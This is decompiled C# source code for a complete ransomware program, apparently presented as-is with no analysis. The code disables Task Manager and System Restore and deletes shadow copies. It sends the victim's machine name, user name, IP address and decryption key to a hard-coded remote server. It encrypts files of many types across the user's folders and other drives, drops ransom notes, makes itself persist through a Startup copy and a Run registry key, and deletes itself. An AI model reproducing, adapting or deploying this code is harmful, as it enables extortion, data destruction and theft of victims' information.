using System;
using System.Collections.Specialized;
using System.Diagnostics;
using System.IO;
using System.Linq;
using System.Net;
using System.Security.Cryptography;
using System.Text;
using System.Threading;
using System.Windows.Forms;
using Microsoft.Win32;
using ns1;
using ns12;
using ns2;

namespace ns0;

internal static class Class0
{
	private static string string_0 = "WW94Y4Fubm90Y3JhY2t0aGlzQWxnb3JpdGhteW61YXJlPmlkaW90PA==";

	private static string string_1 = "Youtube";

	private static string string_2 = Environment.UserName;

	private static string string_3 = Environment.MachineName.ToString();

	private static string string_4 = "C:\\Users\\";

	public static int int_0 = 0;

	private static string string_5 = Environment.GetFolderPath(Environment.SpecialFolder.Startup);

	private static string string_6 = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);

	private static string string_7 = Application.get_ExecutablePath().ToString();

	[STAThread]
	private static void Main()
	{
		if (Class31.smethod_3())
		{
			smethod_3();
			Application.Run();
		}
	}

	private static byte[] smethod_0(byte[] byte_0, byte[] byte_1)
	{
		byte[] result = null;
		byte[] salt = new byte[8] { 55, 55, 60, 90, 10, 80, 39, 80 };
		MemoryStream memoryStream = new MemoryStream();
		try
		{
			RijndaelManaged rijndaelManaged = new RijndaelManaged();
			try
			{
				rijndaelManaged.KeySize = 256;
				rijndaelManaged.BlockSize = 128;
				Rfc2898DeriveBytes rfc2898DeriveBytes = new Rfc2898DeriveBytes(byte_1, salt, 1000);
				rijndaelManaged.Key = rfc2898DeriveBytes.GetBytes(rijndaelManaged.KeySize / 8);
				rijndaelManaged.IV = rfc2898DeriveBytes.GetBytes(rijndaelManaged.BlockSize / 8);
				rijndaelManaged.Mode = CipherMode.CBC;
				CryptoStream cryptoStream = new CryptoStream(memoryStream, rijndaelManaged.CreateEncryptor(), CryptoStreamMode.Write);
				try
				{
					cryptoStream.Write(byte_0, 0, byte_0.Length);
					cryptoStream.Close();
				}
				finally
				{
					bool flag;
					if (!(flag = cryptoStream == null))
					{
						((IDisposable)cryptoStream).Dispose();
					}
				}
				result = memoryStream.ToArray();
			}
			finally
			{
				bool flag;
				if (!(flag = rijndaelManaged == null))
				{
					((IDisposable)rijndaelManaged).Dispose();
				}
			}
		}
		finally
		{
			bool flag;
			if (!(flag = memoryStream == null))
			{
				((IDisposable)memoryStream).Dispose();
			}
		}
		return result;
	}

	private static void smethod_1(string string_8, string string_9)
	{
		byte[] byte_ = File.ReadAllBytes(string_8);
		byte[] bytes = Encoding.UTF8.GetBytes(string_9);
		bytes = SHA256.Create().ComputeHash(bytes);
		byte[] bytes2 = smethod_0(byte_, bytes);
		File.WriteAllBytes(string_8, bytes2);
		File.Move(string_8, string_8 + ".Silent");
	}

	public static void smethod_2(string string_8, string string_9)
	{
		string[] source = new string[195]
		{
			".vb", ".cs", ".c", ".h", ".html", ".7z", ".tar", ".gz", ".m4a", ".wma",
			".aac", ".csv", ".rm", ".txt", ".text", ".zip", ".rar", ".m", ".ai", ".cs",
			".db", ".nd", ".xlsx", ".pl", ".ps", ".py", ".3dm", ".3ds", ".3fr", ".3g2",
			".ini", ".xml", ".jar", ".lz", ".mda", ".log", ".mpeg", ".myo", ".fon", ".gif",
			".JNG", ".jp2", ".PC3", ".PC2", ".PC1", ".PNS", ".MP2", ".AAC", ".3gp", ".ach",
			".arw", ".asf", ".asx", ".avi", ".bak", ".bay", ".mpg", ".mpe", ".swf", ".PPJ",
			".cdr", ".cer", ".cpp", ".cr2", ".crt", ".crw", ".dbf", ".dcr", ".html", ".xhtml",
			".mhtml", ".asp", ".dds", ".der", ".des", ".dng", ".doc", ".dtd", ".dwg", ".dxf",
			".CSS", ".rss", ".jsp", ".php", ".dxg", ".eml", ".eps", ".ert", ".fla", ".fla",
			".flv", ".hpp", ".docm", ".docx", ".flac", ".iif", ".ipe", ".ipg", ".kdc", ".key",
			".lua", ".m4v", ".max", ".xls", ".yuv", ".back", ".mdb", ".mdf", ".mef", ".mov",
			".mp3", ".mp4", ".mpg", ".mrw", ".x3f", ".xlk", ".xlr", ".msg", ".nef", ".nk2",
			".nrw", ".oab", ".obi", ".odb", ".odc", ".wmv", ".wpd", ".wps", ".odm", ".odp",
			".ods", ".odt", ".orf", ".ost", ".p12", ".p7b", ".vob", ".wav", ".wb2", ".p7c",
			".pab", ".pas", ".pct", ".pdb", ".pdd", ".pdf", ".per", ".sr2", ".srf", ".str",
			".ar", ".bz2", ".rz", ".s7z", ".apk", ".zipx", ".pem", ".pfx", ".pps", ".ppt",
			".prf", ".psd", ".pst", ".ptx", ".rw2", ".rwl", ".sql", ".3gp", ".qba", ".qbb",
			".qbm", ".qbr", ".qbw", ".qbx", ".qby", ".r3d", ".raf", ".raw", ".rtf", ".AVI",
			".indd", ".java", ".jpeg", ".pptm", ".pptx", ".xlsb", ".xlsm", ".jpg", ".png", ".ico",
			".JPG", ".MP4", ".MP4", ".FLV", ".MKV"
		};
		string[] files = Directory.GetFiles(string_8);
		string[] directories = Directory.GetDirectories(string_8);
		Thread.Sleep(2000);
		int num = 0;
		bool flag;
		while (flag = num < files.Length)
		{
			try
			{
				string extension = Path.GetExtension(files[num]);
				if (!(flag = !source.Contains(extension)))
				{
					smethod_1(files[num], string_9);
					int_0++;
				}
			}
			catch (SystemException)
			{
			}
			num++;
		}
		num = 0;
		while (flag = num < directories.Length)
		{
			try
			{
				smethod_2(directories[num], string_9);
				smethod_4(directories[num]);
			}
			catch (SystemException)
			{
			}
			num++;
		}
	}

	private static void smethod_3()
	{
		smethod_6("1");
		string text = "0LLRiyDQvdC1INC80L7QttC10YLQtSDQstC30LvQvtC80LDRgtGMINC80LXQvdGPINGPINC+0YfQtdC90Ywg0LbQtdGB0YLQutC40Lk=";
		string text2 = "0123456789956821475003211568489636114775213664748962001451485251474851475144514474541";
		string text3 = "~!@#$%^&*()_+}|?>L=-0|#^&*()*^%#@!~$(_)(*";
		string s = Convert.ToBase64String(Encoding.UTF8.GetBytes(text + text2 + text3));
		byte[] bytes = Convert.FromBase64String(s);
		byte[] bytes2 = Convert.FromBase64String(string_0);
		string @string = Encoding.UTF8.GetString(bytes);
		string string2 = Encoding.Unicode.GetString(bytes);
		string string3 = Encoding.UTF8.GetString(bytes2);
		string text4 = Class1.smethod_0(string2 + @string, text2);
		string text5 = @string + string2;
		string text6 = Class1.smethod_0(text4, text5);
		string text7 = Class1.smethod_0(string.Concat(DateTime.Now), text3);
		string text8 = Class1.smethod_0(string_7, string2);
		string text9 = Class1.smethod_0(Class0.string_4 + Class0.string_2 + DateTime.Today.AddMonths(-3), text8);
		text7 = text7.Replace("a", "").Replace("b", "").Replace("c", "")
			.Replace("d", "")
			.Replace("k", "")
			.Replace("e", "")
			.Replace("f", "")
			.Replace("h", "$")
			.Replace("i", "")
			.Replace("g", "")
			.Replace("l", "")
			.Replace("n", "")
			.Replace("o", "")
			.Replace("p", "")
			.Replace("u", "")
			.Replace("y", "")
			.Replace("t", "^")
			.Replace("r", "")
			.Replace("w", "")
			.Replace("q", "")
			.Replace("E", "")
			.Replace("F", "")
			.Replace("H", "")
			.Replace("I", "")
			.Replace("G", "")
			.Replace("L", "")
			.Replace("N", "")
			.Replace("O", "")
			.Replace("P", "")
			.Replace("U", "")
			.Replace("v", "")
			.Replace("Y", "")
			.Replace("T", "")
			.Replace("R", "")
			.Replace("W", "")
			.Replace("Q", "")
			.Replace("0", "")
			.Replace("S", "%")
			.Replace("F", "")
			.Replace("J", "")
			.Replace("X", "")
			.Replace("Z", "")
			.Replace("M", "")
			.Replace("/", "/")
			.Replace("+", "")
			.Replace("=", "")
			.Replace(" ", "")
			.Replace("m", "")
			.Replace("V", "");
		string text10 = "2334H434a5ck43e22d$b4y1$R13u09s8s644i32a1n$H2a44c6k12e0987r77s6$i55n4$M334o434sc545ow56$T5656v767er7sk7ay4a$S6tr7e8et00";
		string text11 = "12y33o4u5a64r790e887s999o543f2a2r1t4o70c00r54a5c6k5M21e$";
		string text12 = text10.Replace("0", "").Replace("2", "").Replace("1", "")
			.Replace("3", "")
			.Replace("4", "")
			.Replace("5", "")
			.Replace("6", "")
			.Replace("7", "")
			.Replace("8", "")
			.Replace("9", "")
			.Replace("$", " ");
		string text13 = text11.Replace("0", "").Replace("2", "").Replace("1", "")
			.Replace("3", "")
			.Replace("4", "")
			.Replace("5", "")
			.Replace("6", "")
			.Replace("7", "")
			.Replace("8", "")
			.Replace("9", "")
			.Replace("$", " ");
		string text14 = text7 + text8 + text9;
		string text15 = Class1.smethod_0(text10, text11);
		string[] contents = new string[1] { "Dont Remove this File you cannot Recover your file without your id >> Your ID is  >>> " + Environment.NewLine + "Не удалять этот файл, вы не сможете восстановить файлы без вашего идентификатора >> Ваш идентификатор >>>" + Environment.NewLine + Environment.NewLine + text15 + Environment.NewLine };
		smethod_7("/C vssadmin.exe Delete Shadows /All /Quiet");
		string value = new WebClient().DownloadString("http://icanhazip.com").Trim();
		bool flag;
		try
		{
			if (!(flag = !smethod_5()))
			{
				WebClient webClient = new WebClient();
				try
				{
					NameValueCollection nameValueCollection = new NameValueCollection();
					nameValueCollection["pc_name"] = Class0.string_3;
					nameValueCollection["pc_username"] = Class0.string_2;
					nameValueCollection["ip_address"] = value;
					nameValueCollection["key_unlock"] = text14;
					nameValueCollection["id_victim"] = text15;
					nameValueCollection["time_locked"] = string.Concat(DateTime.Now);
					nameValueCollection["total_files_locked"] = int_0.ToString();
					nameValueCollection["reference"] = string_1;
					byte[] array = webClient.UploadValues("http://104.168.188.170/~trehbaof/insert_data_23481f98_f663_4689_8e0a_be27b269582b.php?pass=q1w2e3r4r4e3w2q1", nameValueCollection);
				}
				finally
				{
					if (!(flag = webClient == null))
					{
						((IDisposable)webClient).Dispose();
					}
				}
			}
			string text16 = "\\Downloads";
			string text17 = "\\Documents";
			string text18 = "\\Pictures";
			string text19 = "\\Music";
			string text20 = "\\Videos";
			string text21 = Class0.string_4 + Class0.string_2 + text16;
			string text22 = Class0.string_4 + Class0.string_2 + text17;
			string string_ = Class0.string_4 + Class0.string_2 + text18;
			string string_2 = Class0.string_4 + Class0.string_2 + text19;
			string string_3 = Class0.string_4 + Class0.string_2 + text20;
			smethod_2(text21, text14);
			smethod_4(text21);
			Thread.Sleep(5000);
			smethod_8();
			smethod_2(text22, text14);
			if (!(flag = !smethod_5()))
			{
				WebClient webClient = new WebClient();
				try
				{
					NameValueCollection nameValueCollection = new NameValueCollection();
					nameValueCollection["id_victim"] = text15;
					nameValueCollection["total_files_locked"] = int_0.ToString();
					byte[] array = webClient.UploadValues("http://104.168.188.170/~trehbaof/update_data_23481f98_f663_4689_8e0a_be27b269582b.php?pass=q1w2e3r4r4e3w2q1", nameValueCollection);
				}
				finally
				{
					if (!(flag = webClient == null))
					{
						((IDisposable)webClient).Dispose();
					}
				}
			}
			smethod_2(string_, text14);
			smethod_2(string_2, text14);
			Thread.Sleep(5000);
			smethod_2(string_3, text14);
			string path = text21 + "//YourID.txt";
			string path2 = text22 + "//YourID.txt";
			File.WriteAllLines(path, contents);
			File.WriteAllLines(path2, contents);
			if (!(flag = !smethod_5()))
			{
				WebClient webClient = new WebClient();
				try
				{
					NameValueCollection nameValueCollection = new NameValueCollection();
					nameValueCollection["id_victim"] = text15;
					nameValueCollection["total_files_locked"] = int_0.ToString();
					byte[] array = webClient.UploadValues("http://104.168.188.170/~trehbaof/update_data_23481f98_f663_4689_8e0a_be27b269582b.php?pass=q1w2e3r4r4e3w2q1", nameValueCollection);
				}
				finally
				{
					if (!(flag = webClient == null))
					{
						((IDisposable)webClient).Dispose();
					}
				}
			}
			string[] logicalDrives = Environment.GetLogicalDrives();
			string[] array2 = logicalDrives;
			int num = 0;
			while (flag = num < array2.Length)
			{
				string text23 = array2[num];
				DriveInfo driveInfo = new DriveInfo(text23);
				if ((flag = !(driveInfo.RootDirectory.Name.ToString() == "C:\\")) && !(flag = !driveInfo.IsReady))
				{
					DirectoryInfo rootDirectory = driveInfo.RootDirectory;
					smethod_2(text23, text14);
					Thread.Sleep(4000);
					if (!(flag = !smethod_5()))
					{
						WebClient webClient = new WebClient();
						try
						{
							NameValueCollection nameValueCollection = new NameValueCollection();
							nameValueCollection["id_victim"] = text15;
							nameValueCollection["total_files_locked"] = int_0.ToString();
							byte[] array = webClient.UploadValues("http://104.168.188.170/~trehbaof/update_data_23481f98_f663_4689_8e0a_be27b269582b.php?pass=q1w2e3r4r4e3w2q1", nameValueCollection);
						}
						finally
						{
							if (!(flag = webClient == null))
							{
								((IDisposable)webClient).Dispose();
							}
						}
					}
				}
				num++;
			}
		}
		catch
		{
		}
		string string_4 = Class0.string_4 + "Public";
		smethod_2(string_4, text14);
		string text24 = "\\Desktop\\";
		string text25 = Class0.string_4 + Class0.string_2 + text24;
		string string_5 = Class0.string_4;
		smethod_2(text25, text14);
		string path3 = text25 + "//YourID.txt";
		string path4 = text25 + "//Ваш идентификатор";
		File.WriteAllLines(path3, contents);
		File.WriteAllLines(path4, contents);
		smethod_4(text25);
		Thread.Sleep(3000);
		smethod_2(string_5, text14);
		string text26 = Class0.string_4 + Class0.string_2 + "\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\ ша еру ";
		if (!(flag = !Directory.Exists(text26)))
		{
			smethod_4(text26);
		}
		int_0 = 0;
		text14 = null;
		try
		{
			ProcessStartInfo processStartInfo = new ProcessStartInfo();
			processStartInfo.Arguments = "/C choice /C Y /N /D Y /T 3 & Del " + Application.get_ExecutablePath();
			processStartInfo.WindowStyle = ProcessWindowStyle.Hidden;
			processStartInfo.CreateNoWindow = true;
			processStartInfo.FileName = "cmd.exe";
			Process.Start(processStartInfo);
			Application.Exit();
		}
		catch (SystemException)
		{
		}
	}

	private static void smethod_4(string string_8)
	{
		string path = string_8 + "//Hacked_Read_me_to_decrypt_files.Html";
		string[] contents = new string[1] { Class2.smethod_1() };
		File.WriteAllLines(path, contents);
	}

	public static bool smethod_5()
	{
		try
		{
			WebClient webClient = new WebClient();
			try
			{
				Stream stream = webClient.OpenRead("http://www.google.com");
				try
				{
					return true;
				}
				finally
				{
					bool flag;
					if (!(flag = stream == null))
					{
						((IDisposable)stream).Dispose();
					}
				}
			}
			finally
			{
				bool flag;
				if (!(flag = webClient == null))
				{
					((IDisposable)webClient).Dispose();
				}
			}
		}
		catch
		{
			return false;
		}
	}

	public static void smethod_6(string string_8)
	{
		try
		{
			RegistryKey registryKey = Registry.CurrentUser.CreateSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System");
			registryKey.SetValue("DisableTaskMgr", string_8);
			registryKey.Close();
			RegistryKey registryKey2 = Registry.LocalMachine.OpenSubKey("SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\SystemRestore\\Setup\\Generalize");
			registryKey2.SetValue("DisableSR", string_8);
			registryKey2.Close();
		}
		catch
		{
		}
	}

	private static void smethod_7(string string_8)
	{
		Process process = new Process();
		ProcessStartInfo processStartInfo = new ProcessStartInfo();
		processStartInfo.WindowStyle = ProcessWindowStyle.Hidden;
		processStartInfo.FileName = "cmd.exe";
		processStartInfo.Arguments = string_8;
		process.StartInfo = processStartInfo;
		process.Start();
	}

	private static void smethod_8()
	{
		Directory.CreateDirectory(string_6 + "\\Windows\\");
		string_6 = Path.Combine(string_6 + "\\Windows\\", "win.exe");
		try
		{
			bool flag;
			if (!(flag = File.Exists(string_6)))
			{
				File.Copy(string_7, string_6, overwrite: false);
			}
		}
		catch
		{
		}
		string_5 = Path.Combine(string_5, "win.exe");
		try
		{
			bool flag;
			if (!(flag = File.Exists(string_5)))
			{
				File.Copy(string_7, string_5, overwrite: false);
			}
		}
		catch
		{
		}
		try
		{
			RegistryKey registryKey = Registry.CurrentUser.OpenSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Run", writable: true);
			bool flag;
			if (!(flag = registryKey.GetValue("Driver") != null))
			{
				registryKey.SetValue("Driver", "\"" + string_6 + "\" /autostart");
			}
			registryKey.Close();
		}
		catch
		{
		}
	}
}
